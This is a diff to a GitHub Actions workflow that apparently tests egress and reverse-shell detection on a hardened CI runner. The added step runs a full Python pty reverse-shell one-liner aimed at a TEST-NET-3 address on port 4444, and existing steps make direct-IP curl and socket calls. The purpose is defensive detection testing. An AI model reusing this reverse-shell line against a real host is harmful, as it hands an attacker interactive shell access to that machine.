@@ -1,10 +1,7 @@
 name: Direct IP egress detection test
 
-# Exercises the direct-IP:443-with-no-domain code path on a GitHub-hosted runner.
-# By default that shape is hidden from the steps and suppressed from detection;
-# with the per-customer EnableDirectIP443Detection opt-in it should surface at its
-# real step and (once the job baseline is mature and the IP is new) generate a
-# New-Outbound-Network-Call detection that fails the Harden-Runner check.
+# Exercises the direct-IP:443-with-no-domain code path and interpreter reverse-shell
+# detection on a GitHub-hosted runner.
 
 on:
   push:
@@ -50,3 +47,11 @@ jobs:
           echo "Testing new direct IP: $IP"
           curl -v --max-time 8 "https://$IP:443/" -o /dev/null || true
           timeout 8 python3 -c "import socket; s=socket.socket(); s.settimeout(6); s.connect(('$IP',443)); s.close()" || true
+
+      # Interpreter reverse shell (python pty.spawn). No listener is needed: the
+      # classifier inspects the process argv, so it is detected even though the
+      # connection to the (unrouted TEST-NET-3) address times out.
+      - name: interpreter reverse shell (python pty)
+        if: always()
+        run: |
+          timeout 8 python3 -c 'import socket,os,pty;s=socket.socket();s.settimeout(5);s.connect(("203.0.113.20",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' || true
